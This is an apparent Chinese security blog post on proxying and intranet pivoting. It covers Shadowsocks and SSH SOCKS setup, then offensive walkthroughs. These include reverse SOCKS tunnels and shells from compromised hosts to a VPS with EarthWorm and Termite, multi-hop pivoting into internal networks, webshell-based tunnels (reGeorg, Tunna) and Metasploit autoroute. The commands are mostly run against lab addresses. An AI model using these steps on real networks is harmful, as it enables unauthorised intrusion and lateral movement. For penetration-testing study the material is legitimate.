<!DOCTYPE html>
<html>

  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>代理</title>
    <meta name="description" content="">

    <link rel="shortcut icon" href="/favicon.ico?" type="image/x-icon">
    <link rel="icon" href="/favicon.ico?" type="image/x-icon">
    <link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://at.alicdn.com/t/font_8v3czwksspqlg14i.css">
    <link rel="stylesheet" href="/css/main.css ">
    <link rel="canonical" href="http://localhost:4000/2017/11/29/proxy/">
    <link rel="alternate" type="application/rss+xml" title="Jirairya" href="http://localhost:4000/feed.xml ">


    <script>
    // 百度统计代码
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?973906e37cc7bcb6714807627cf64ec6";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
    </script>


    <script>
    // google analytics
      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

      ga('create', 'UA-111240288-1', 'auto');
      ga('send', 'pageview');

    </script>



</head>


  <body>

    <header id="top">
    <div class="wrapper">
        <a href="/" class="brand">Jirairya</a>
        <small></small>
        <button id="headerMenu" class="menu"><i class="fa fa-bars"></i></button>
        <nav id="headerNav">
            <ul>
                <li>
                    
                    <a href="/">
                    
                        <i class="fa fa-home"></i>Home
                    </a>
                </li>

                
                    
                    <li>
                        
                        <a href="/archive/">
                        
                            <i class="fa fa-archive"></i>Archives
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/category/">
                        
                            <i class="fa fa-th-list"></i>Categories
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/tag/">
                        
                            <i class="fa fa-tags"></i>Tags
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/collections/">
                        
                            <i class="fa fa-folder-open"></i>Collections
                        </a>
                    </li>
                    
                
                    
                
                    
                    <li>
                        
                        <a href="/skills/">
                        
                            <i class="fa fa-bezier-curve"></i>Skills
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/tools/">
                        
                            <i class="fa fa-toolbox"></i>Tools
                        </a>
                    </li>
                    
                
                    
                    <li>
                        
                        <a href="/about/">
                        
                            <i class="fa fa-paper-plane"></i>About
                        </a>
                    </li>
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
            </ul>
        </nav>
    </div>
</header>


        <div class="page clearfix" post>
    <div class="left">
        <h1>代理</h1>
        <div class="label">

            <div class="label-card">
                <i class="fa fa-calendar"></i>2017-11-29
            </div>

            <div class="label-card">
                
            </div>

            <div class="label-card">
                
            </div>

            <div class="label-card">
            


<!-- <span class="point">•</span> -->
<span class="categories">
  <i class="fa fa-th-list"></i>
  
    
        <a href="/category/#hack" title="Category: hack" rel="category">hack</a>&nbsp;
    
        <a href="/category/#skills" title="Category: skills" rel="category">skills</a>
    
  

  <!-- <span class="point">•</span> -->
</span>


            </div>

            <div class="label-card">
            
<!-- <span class="point">•</span> -->
<span class="pageTag">
  <i class="fa fa-tags"></i>
  
    
        <!--a href="/tag/#sec" title="Tag: sec" rel="tag">sec</a-->
        <a href="/tag/#sec" title="Tag: sec" rel="tag">sec</a>&nbsp;
    
        <!--a href="/tag/#skills" title="Tag: skills" rel="tag">skills</a-->
        <a href="/tag/#skills" title="Tag: skills" rel="tag">skills</a>&nbsp;
    
        <!--a href="/tag/#proxy" title="Tag: proxy" rel="tag">proxy</a-->
        <a href="/tag/#proxy" title="Tag: proxy" rel="tag">proxy</a>
    
  

</span>

            </div>

        </div>
        <hr>
        <article itemscope itemtype="http://schema.org/BlogPosting">
        <ul id="markdown-toc">
  <li><a href="#ss和porxychains结合实现任意应用代理" id="markdown-toc-ss和porxychains结合实现任意应用代理">SS和PorxyChains结合实现任意应用代理</a>    <ul>
      <li><a href="#安装ss" id="markdown-toc-安装ss">安装ss</a>        <ul>
          <li><a href="#安装ss-qt5" id="markdown-toc-安装ss-qt5">安装ss-qt5</a></li>
          <li><a href="#安装ss命令行" id="markdown-toc-安装ss命令行">安装ss命令行</a></li>
        </ul>
      </li>
      <li><a href="#设置porxychains" id="markdown-toc-设置porxychains">设置Porxychains</a></li>
    </ul>
  </li>
  <li><a href="#ssh实现socks代理" id="markdown-toc-ssh实现socks代理">SSH实现Socks代理</a>    <ul>
      <li><a href="#linux实现代理" id="markdown-toc-linux实现代理">Linux实现代理</a></li>
      <li><a href="#windows实现代理" id="markdown-toc-windows实现代理">Windows实现代理</a></li>
    </ul>
  </li>
  <li><a href="#termite" id="markdown-toc-termite">Termite</a>    <ul>
      <li><a href="#正向socks-v5" id="markdown-toc-正向socks-v5">正向Socks v5</a></li>
      <li><a href="#反弹socks服务器" id="markdown-toc-反弹socks服务器">反弹Socks服务器</a></li>
      <li><a href="#二级网络环境" id="markdown-toc-二级网络环境">二级网络环境</a></li>
      <li><a href="#三级网络环境" id="markdown-toc-三级网络环境">三级网络环境</a></li>
    </ul>
  </li>
  <li><a href="#http-service代理" id="markdown-toc-http-service代理">HTTP service代理</a>    <ul>
      <li><a href="#regeorg" id="markdown-toc-regeorg">reGeorg</a></li>
      <li><a href="#tunna" id="markdown-toc-tunna">tunna</a></li>
    </ul>
  </li>
  <li><a href="#msf" id="markdown-toc-msf">msf</a>    <ul>
      <li><a href="#pivot" id="markdown-toc-pivot">pivot</a></li>
      <li><a href="#socks4" id="markdown-toc-socks4">socks4</a></li>
    </ul>
  </li>
  <li><a href="#内网穿透平台" id="markdown-toc-内网穿透平台">内网穿透平台</a></li>
  <li><a href="#refer" id="markdown-toc-refer">Refer:</a></li>
</ul>

<!--more-->

<h1 id="ss和porxychains结合实现任意应用代理">SS和PorxyChains结合实现任意应用代理</h1>

<h2 id="安装ss">安装ss</h2>

<h3 id="安装ss-qt5">安装ss-qt5</h3>

<p>在<code class="highlighter-rouge"> /etc/apt/sources.list</code>添加<code class="highlighter-rouge">deb http://ppa.launchpad.net/hzwhuang/ss-qt5/ubuntu devel main</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apt-get update&amp;&amp;apt-get install shadowsocks-qt5
</code></pre></div></div>

<p>安装好之后，导入账户就行</p>

<h3 id="安装ss命令行">安装ss命令行</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>pip install shadowsocks
</code></pre></div></div>

<p>然后编写<code class="highlighter-rouge">/etc/ss.json</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span> 
        <span class="s2">"server"</span>:<span class="s2">"服务器地址"</span>, 
        <span class="s2">"server_port"</span>:服务器端口号, 
        <span class="s2">"local_address"</span>: <span class="s2">"127.0.0.1"</span>, 
        <span class="s2">"local_port"</span>:1080, 
        <span class="s2">"password"</span>:<span class="s2">"密码"</span>, 
        <span class="s2">"timeout"</span>:300, 
        <span class="s2">"method"</span>:<span class="s2">"加密方式"</span>, 
        <span class="s2">"fast_open"</span>: <span class="nb">true</span>, 
        <span class="s2">"workers"</span>: 1
<span class="o">}</span>
</code></pre></div></div>

<p>然后启动：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# sslocal <span class="nt">-c</span> /etc/ss.json 
</code></pre></div></div>

<h2 id="设置porxychains">设置Porxychains</h2>

<p>打开<code class="highlighter-rouge">/etc/proxychains.conf</code>，将<code class="highlighter-rouge">dynamic_chain</code>去注释，在末尾添加<code class="highlighter-rouge">socks5 127.0.0.1 1080</code></p>

<p>执行<code class="highlighter-rouge">proxyresolv www.google.com</code>，提示命令找不到。复制文件：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cp /usr/lib/proxychains3/proxyresolv /usr/bin/
</code></pre></div></div>

<p>再次执行<code class="highlighter-rouge">proxyresolv www.google.com</code></p>

<p><img src="/img/hack/%E4%BB%A3%E7%90%86/proxychains.png" alt="" /></p>

<p>refer:http://www.freebuf.com/sectool/123931.html</p>

<h1 id="ssh实现socks代理">SSH实现Socks代理</h1>

<h2 id="linux实现代理">Linux实现代理</h2>

<p>先在终端输入：</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh -D localhost:9050 root@VPS_IP -p端口
</code></pre></div></div>

<p>在打开Socks代理：</p>

<p><img src="/img/hack/%E4%BB%A3%E7%90%86/ssh%E5%8A%A8%E6%80%81%E8%BD%AC%E5%8F%91.png" alt="" /></p>

<h2 id="windows实现代理">Windows实现代理</h2>

<p>0x01 配置Xshell，并通过ssh连接远程主机（测试中的ssh服务器为一台位于美国的私人VPS），如下图示:</p>

<p><img src="img/hack/%E4%BB%A3%E7%90%86/xshell%E8%BF%9E%E6%8E%A5ssh.png" alt="XShell连接ssh" /></p>

<p>0x02 在 文件－&gt; 属性 菜单配置 socks代理的隧道:</p>

<p><img src="/img/hack/%E4%BB%A3%E7%90%86/xhsell%E9%85%8D%E7%BD%AEsocks%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93.png" alt="" /></p>

<p><img src="/img/hack/%E4%BB%A3%E7%90%86/xhsell%E9%85%8D%E7%BD%AEsocks%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%932.png" alt="" /></p>

<p><img src="/img/hack/%E4%BB%A3%E7%90%86/xhsell%E9%85%8D%E7%BD%AEsocks%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%933.png" alt="" /></p>

<p><img src="/img/hack/%E4%BB%A3%E7%90%86/xhsell%E9%85%8D%E7%BD%AEsocks%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%934.png" alt="" /></p>

<h1 id="termite">Termite</h1>

<p>Termite是EW的升级版。跨平台使用，见<a href="http://rootkiter.com/Termite/">Termite</a>:http://rootkiter.com/Termite/</p>

<h2 id="正向socks-v5">正向Socks v5</h2>

<ol>
  <li>若目标机器有外网IP，就可以使用EW建立ss:</li>
</ol>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ew <span class="nt">-s</span> ssocksd <span class="nt">-l</span> 1080
</code></pre></div></div>

<ol>
  <li>Termite建立ss：</li>
</ol>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//开启节点：
./agent_Linux64 <span class="nt">-l</span> 8888

//使用admin程序连接具有公网的机器IP：
./admin_Linux64 <span class="nt">-c</span> 127.0.0.1 <span class="nt">-p</span> 1234

//使用show查看拓扑，然后跳转到有公网的节点ID上：
goto 1

//执行socks功能：
socks 1080

//此时VPS上面的1080就架设了一个服务器。
</code></pre></div></div>

<p><img src="/img/hack/%E4%BB%A3%E7%90%86/Termite/%E6%AD%A3%E5%90%91socks.png" alt="" /></p>

<h2 id="反弹socks服务器">反弹Socks服务器</h2>

<p>目标机器没有公网IP，但可以访问公网资源</p>

<ol>
  <li>EW：</li>
</ol>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>VPS： ew <span class="nt">-s</span> rcsocks <span class="nt">-l</span> 1080 <span class="nt">-e</span> 999
Target: ew <span class="nt">-s</span> rssocks <span class="nt">-d</span> vps的IP <span class="nt">-e</span> 999
</code></pre></div></div>

<p>然后就可以用VPS上的1080作为代理进入内网</p>

<ol>
  <li>Termite</li>
</ol>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>VPS:  ./agent_Linux64 <span class="nt">-l</span> 888
Target: ./agent_exe <span class="nt">-c</span> VPS的IP <span class="nt">-p</span> 888
VPS: ./admin_Linux64 <span class="nt">-c</span> 127.0.0.1 <span class="nt">-p</span> 888
此时获取一个admin的终端，然后查看节点，target会变成2节点
goto 2
socks 1081  //现在可以以vps上面1081作为代理进入目标内网
shell 6666  //在vps上面直接nc 127.0.0.1 6666可以获取目标主机的shell
</code></pre></div></div>

<p><img src="/img/hack/%E4%BB%A3%E7%90%86/Termite/%E5%8F%8D%E5%BC%B9socks.png" alt="" /></p>

<blockquote>
  <p>downfile和upfile  //可以直接下载上传文件</p>
</blockquote>

<h2 id="二级网络环境">二级网络环境</h2>

<ol>
  <li>EW：</li>
</ol>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//在vps上面添加转接隧道，把10800端口收到的代理请求转发给888
VPS: ew <span class="nt">-s</span> lcx_listen <span class="nt">-l</span> 10800 <span class="nt">-e</span> 888 

//B主机启动socks代理，端口999
B: ew <span class="nt">-s</span> ssocksd <span class="nt">-l</span> 999   

//在A主机上面使用lcx_slave的方式，把公网的888端口和B主机的999端口连接起来
A: ew <span class="nt">-s</span> lcx_slave <span class="nt">-d</span> VPS的IP <span class="nt">-e</span> 888 <span class="nt">-f</span> 10.48.128.49 <span class="nt">-g</span> 999 

//现在可以通过vps的10800来使用B主机架设的socks5代理
</code></pre></div></div>

<ol>
  <li>Termite</li>
</ol>

<p>基本步骤如下：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>VPS: ./agent_exe <span class="nt">-l</span> 888
A主机: ./agent_exe <span class="nt">-c</span> <span class="o">[</span>139.x.x.113] <span class="nt">-p</span> 888
VPS: ./admin_exe <span class="nt">-c</span> 127.0.0.1 <span class="nt">-p</span> 888
goto 2
listen 999
B主机: ./agent_exe <span class="nt">-c</span> 10.48.128.49 <span class="nt">-p</span> 999
此时B主机节点是3
goto 3 
socks 10800
</code></pre></div></div>

<p><strong>例子：</strong></p>

<p>0x01 在vps(10.10.10.147)上开启节点：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./agent_Linux64 <span class="nt">-l</span> 1234
</code></pre></div></div>

<p>0x02 在本地主机上，使用admin程序连接、管理：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\T</span>im<span class="se">\D</span>esktop<span class="se">\T</span>unna-master&gt;C:<span class="se">\U</span>sers<span class="se">\T</span>im<span class="se">\D</span>esktop<span class="se">\T</span>ermite<span class="se">\a</span>dmin_Win32.exe <span class="nt">-c</span> 10.10.10.147 <span class="nt">-p</span> 1234
</code></pre></div></div>

<p><img src="/img/hack/%E4%BB%A3%E7%90%86/Termite/%E4%BA%8C%E7%BA%A7%E7%BD%91%E7%BB%9C_%E6%9C%AC%E5%9C%B0%E4%B8%BB%E6%9C%BAadmin%E8%BF%9E%E6%8E%A5vps.png" alt="" /></p>

<p>0x03 在目标机器A上执行：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\w</span>in2k8_web<span class="se">\D</span>esktop<span class="se">\T</span>ermite&gt;agent_Win32.exe <span class="nt">-c</span> 10.10.10.147 <span class="nt">-p</span> 1234
</code></pre></div></div>

<p><img src="/img/hack/%E4%BB%A3%E7%90%86/Termite/%E4%BA%8C%E7%BA%A7%E7%BD%91%E7%BB%9C_%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8A%E6%88%90%E4%B8%BA%E8%8A%82%E7%82%B9.png" alt="" /></p>

<p>0x04 在本地主机上的admin 程序中执行监听：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;&gt;</span> goto 2

<span class="o">&gt;&gt;&gt;&gt;</span> listen 999
</code></pre></div></div>

<p><img src="/img/hack/%E4%BB%A3%E7%90%86/Termite/%E4%BA%8C%E7%BA%A7%E7%BD%91%E7%BB%9C_%E8%BF%9B%E5%85%A5A%E6%9C%BA%E5%99%A8%E7%9A%84%E8%8A%82%E7%82%B9%E8%BF%9B%E8%A1%8C%E7%9B%91%E5%90%AC.png" alt="" /></p>

<p>0x04 在内网的B主机上执行agent程序，连接A主机的IP和端口，成为节点：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\w</span>in2k8<span class="se">\D</span>esktop<span class="se">\T</span>ermite&gt;agent_Win32.exe <span class="nt">-c</span> 192.168.200.20 <span class="nt">-p</span> 999
</code></pre></div></div>

<p><img src="/img/hack/%E4%BB%A3%E7%90%86/Termite/%E6%96%B0%E5%8A%A0%E5%85%A5B%E6%9C%BA%E5%99%A8%E7%9A%84%E8%8A%82%E7%82%B9.png" alt="" /></p>

<p>0x05 在本地主机上的admin程序跳转到B机器的节点上，然后执行开启shell：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;&gt;</span> goto 3

<span class="o">&gt;&gt;&gt;&gt;</span> shell 7777
</code></pre></div></div>

<p><img src="/img/hack/%E4%BB%A3%E7%90%86/Termite/%E4%BA%8C%E7%BA%A7%E7%BD%91%E7%BB%9C_%E6%9C%AC%E5%9C%B0%E4%B8%BB%E6%9C%BA%E8%BF%9E%E6%8E%A5%E5%86%85%E7%BD%91B%E6%9C%BA%E5%99%A8%E7%9A%84shell.png" alt="" /></p>

<p>将内网机器B的3389端口映射到本地机器</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;&gt;</span> lcxtran 3388 192.168.200.10 3389
</code></pre></div></div>

<p>本地连接本地端口3388就可以连接到内网机器B的3389:</p>

<p><img src="/img/hack/%E4%BB%A3%E7%90%86/Termite/%E4%BA%8C%E7%BA%A7%E7%BD%91%E7%BB%9C_lcxtran.png" alt="" /></p>

<h2 id="三级网络环境">三级网络环境</h2>

<ol>
  <li>EW:</li>
</ol>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>VPS: ew <span class="nt">-s</span> rcsoskc <span class="nt">-l</span> 1080 <span class="nt">-e</span> 888

A: ew <span class="nt">-s</span> lcx_slave <span class="nt">-d</span> VPS的IP <span class="nt">-e</span> 888 <span class="nt">-f</span> 10.48.128.12 <span class="nt">-g</span> 999

B: ew <span class="nt">-s</span> lcx_listen <span class="nt">-l</span> 999 <span class="nt">-e</span> 777

C: ew <span class="nt">-s</span> rssocks <span class="nt">-d</span> 机器B的IP <span class="nt">-e</span> 777
</code></pre></div></div>

<ol>
  <li>Termite</li>
</ol>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>VPS: ./agent_exe <span class="nt">-l</span> 888

A主机: ./agent_exe <span class="nt">-c</span> VPS的IP <span class="nt">-p</span> 888

VPS: ./admin_exe <span class="nt">-c</span> 127.0.0.1 <span class="nt">-p</span> 888

//B主机开启一个监听
B: ./agent_exe <span class="nt">-l</span> 999  

//在管理员中跳转到A节点
goto 2 
//连接到B主机
connect B机器的IP  999 

C: ./agent_exe <span class="nt">-l</span> 777

//跳转到B主机节点
goto 3  
//在B节点连接C主机
connect C机器的IP 777  

或者在C节点直接连接B:

goto 3 //跳到B
listen 666

C: ./agent_exe <span class="nt">-c</span> B机器的IP 666
</code></pre></div></div>

<hr />

<h1 id="http-service代理">HTTP service代理</h1>

<p>若目标是在DMZ中，只有WEB数据能出来的时候就用HTTP的代理</p>

<blockquote>
  <p>见redrain大佬的<a href="http://128.199.223.185/drops/tips-5234.html">内网渗透随想</a>（http://drops.wooyun.org/tips/5234）：</p>
</blockquote>

<p>在目标服务器上传一个webshell，通过shell来做所有的流量转发到内网，常见的几个工具有<a href="https://github.com/sensepost/reGeorg/tree/1ca54c2a6ab22ded150d04cff8fdb796990b1ced">reGeorg</a>，meterpreter，tunna等等，甚至直接写一个简单的代理脚本，在自己机器上配置一下nginx直接进行反向代理</p>

<h2 id="regeorg">reGeorg</h2>

<p>见<a href="https://github.com/sensepost/reGeorg/tree/1ca54c2a6ab22ded150d04cff8fdb796990b1ced">reGeorg</a></p>

<p>上传tunnel.aspx文件到目标服务器，然后在kali上执行以下命令进行代理：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python reGeorgSocksProxy.py <span class="nt">-u</span> <span class="s2">"http://10.10.10.129/tunnel.aspx"</span> <span class="nt">-p</span> 8081
</code></pre></div></div>

<p>在<code class="highlighter-rouge">/etc/proxychains.conf</code>添加<code class="highlighter-rouge">-p</code>指定的端口，然后使用proxychains进行代理：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>proxychains xfreerdp /u:win2k8 /p:admin /v:192.168.200.10
</code></pre></div></div>

<p><img src="/img/hack/%E4%BB%A3%E7%90%86/reG.png" alt="" /></p>

<blockquote>
  <p>进行proxychains进行代理nmap扫描时候，尽量使用<code class="highlighter-rouge">-sT</code>和 <code class="highlighter-rouge">-Pn</code></p>
</blockquote>

<h2 id="tunna">tunna</h2>

<p>见<a href="https://github.com/SECFORCE/Tunna">Tunna</a>(https://github.com/SECFORCE/Tunna):</p>

<p>先上传webshell到目标网站，尝试访问webshell，返回正常就在本地执行：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python proxy.py <span class="nt">-u</span> <span class="s2">"http://目标域名/conn.aspx"</span> <span class="nt">-l</span> 要绑定的本地端口 <span class="nt">-r</span> 远程机器上的指定端口[3389] <span class="nt">-v</span> 
//端口转发


python proxy.py <span class="nt">-u</span> <span class="s2">"http://目标域名/conn.aspx"</span> <span class="nt">-l</span> 要绑定的本地端口 <span class="nt">-a</span> 内网机器的ip <span class="nt">-r</span> 内网机器的指定端口 <span class="nt">-v</span>  


python proxy.py <span class="nt">-u</span> <span class="s2">"http://目标域名/conn.aspx"</span> <span class="nt">-l</span> 要绑定的本地端口 <span class="nt">-r</span> 远程机器上的指定端口[22] <span class="nt">-s</span><span class="o">[</span>转发ssh服务需要加上此选项] <span class="nt">-v</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\T</span>im<span class="se">\D</span>esktop<span class="se">\T</span>unna-master&gt;&gt;python proxy.py <span class="nt">-u</span> <span class="s2">"http://10.10.10.130/conn.aspx"</span> <span class="nt">-l</span> 1234 <span class="nt">-r</span> 3389 <span class="nt">-v</span>
</code></pre></div></div>

<p><img src="/img/hack/%E4%BB%A3%E7%90%86/tunna.png" alt="tunna本地端口转发" />
<img src="/img/hack/%E4%BB%A3%E7%90%86/tunna2.png" alt="" /></p>

<blockquote>
  <p>远程桌面连接，刚跳出要验证身份脚本就提示<code class="highlighter-rouge">killing the handler thread</code>。这时不要关闭远程桌面连接验证身份的这个黄色窗口，再次执行脚本，然后点击是就可以连接了。</p>
</blockquote>

<h1 id="msf">msf</h1>

<h2 id="pivot">pivot</h2>

<p>得到meterpreter之后，在meterpreter会话中执行，添加路由：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>run autoroute <span class="nt">-s</span> 192.168.200.0/24

run autoroute <span class="nt">-p</span>
</code></pre></div></div>

<p>代理成功之后，使用arp扫描：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use post/windows/gather/arp_scanner

<span class="nb">set </span>RHOSTS 目标子网

<span class="nb">set </span>SESSION meterpreter会话ID

run
</code></pre></div></div>

<h2 id="socks4">socks4</h2>

<p>见<a href="https://klionsec.github.io/2016/09/25/msf-socks4a/">通向彼岸 之内网代理转发——msf中的socs4a模块使用及meterpreter多级内网穿透</a>（https://klionsec.github.io/2016/09/25/msf-socks4a/）</p>

<hr />

<h1 id="内网穿透平台">内网穿透平台</h1>

<ul>
  <li>https://www.ngrok.cc/</li>
  <li>https://natapp.cn /</li>
</ul>

<h1 id="refer">Refer:</h1>

<ul>
  <li>使用Socks代理服务:http://rootkiter.com/</li>
  <li><a href="http://128.199.223.185/drops/tips-5234.html">内网渗透随想</a>:http://drops.wooyun.org/tips/5234</li>
  <li><a href="https://www.t00ls.net/articles-29389.html">tunna 的使用问题解决方法</a>:https://www.t00ls.net/articles-29389.html</li>
</ul>

<p>resource:</p>

<ul>
  <li><a href="http://rootkiter.com/EarthWorm/index.html">Earthworm是一款内网穿透工具</a>:http://rootkiter.com/EarthWorm/index.html)</li>
  <li><a href="http://rootkiter.com/Termite/">跳板机管理工具</a></li>
  <li><a href="http://www.sockscap64.com">sockscap64</a>:http://www.sockscap64.com</li>
  <li><a href="http://sourceforge.net/projects/ssocks/">ssocks</a>:http://sourceforge.net/projects/ssocks/</li>
  <li>内网穿透平台
    <ul>
      <li>https://www.ngrok.cc/</li>
      <li>https://natapp.cn /</li>
    </ul>
  </li>
</ul>


        </article>
        <hr>

        
        
            
            
                
                    
                        
                        <h2 id="similar_posts">Similar Posts</h2>
                        <ul>
                        
                        <li class="relatedPost">
                            <a href="/2018/02/08/Shodan-Manual/">Shodan手册
                            
                            </a>
                        </li>
                        
                        
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                        
                        <li class="relatedPost">
                            <a href="/2018/01/27/hidden-the-network/">阻碍获取真实网络指纹
                            
                            </a>
                        </li>
                        
                        
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                        
                        <li class="relatedPost">
                            <a href="/2018/01/04/command-and-control-images/">command-and-control-images
                            
                            </a>
                        </li>
                        
                        
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                        
                        <li class="relatedPost">
                            <a href="/2017/12/27/open-RDP/">开启RDP
                            
                            </a>
                        </li>
                        
                        
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                        
                        <li class="relatedPost">
                            <a href="/2017/11/30/Test-LAB-11/">TEST LAB 11
                            
                            </a>
                        </li>
                        
                        
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                        
                        <li class="relatedPost">
                            <a href="/2017/11/29/port-fowarding-and-socks-proxy/">Socks端口转发和Socks端口代理
                            
                            </a>
                        </li>
                        
                        
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
        
            
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
                
                    
                
                    
                
                    
                
            
        
        
            </ul>
        

        <div class="post-recent">
    <div class="pre">
        
        <p><strong>上一篇</strong> <a href="/2017/11/29/port-fowarding-and-socks-proxy/">Socks端口转发和Socks端口代理</a></p>
        
    </div>
    <div class="nex">

        
        <p><strong>下一篇</strong> <a href="/2017/11/30/Test-LAB-11/">TEST LAB 11</a></p>
        
    </div>
</div>


        <h2 id="comments">Comments</h2>
        


<div id="disqus_thread"></div>
<script>
    /**
     * RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
     * LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
     */

    var disqus_config = function() {
        this.page.url = 'http://localhost:4000/2017/11/29/proxy/'; // Replace PAGE_URL with your page's canonical URL variable
        this.page.identifier = 'http://localhost:4000/2017/11/29/proxy/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
    };

    (function() { // DON'T EDIT BELOW THIS LINE
        var d = document,
            s = d.createElement('script');

        s.src = '//http-b404-xyz.disqus.com/embed.js';

        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>




    </div>
    <button class="anchor"><i class="fa fa-anchor"></i></button>
    <div class="right">
        <div class="wrap">

            <!-- Content -->
            <div class="side content">
                <div>
                    Content
                </div>
                <ul id="content-side" class="content-ul">
                    
                    <li><a href="#similar_posts">Similar Posts</a></li>
                    
                    <li><a href="#comments">Comments</a></li>
                </ul>
            </div>
            <!-- 其他div框放到这里 -->
            <!-- <div class="side">bbbb</div> -->
        </div>
    </div>
</div>
<script>
/**
 * target _blank
 */
(function() {
    var aTags = document.querySelectorAll('article a:not([id])')
    for (var i = 0; i < aTags.length; i++) {
        aTags[i].setAttribute('target', '_blank')
    }
}());
</script>
<script src="/js/pageContent.js " charset="utf-8"></script>


    <footer class="site-footer">


    <div class="wrapper">

        <p class="description">
             The quieter you become, the more you can hear. 
        </p>

        <br>
        <p class="contact">
             
            <a href="https://github.com/9jan" title="GitHub"><i class="fa fa-github" aria-hidden="true"></i></a>  
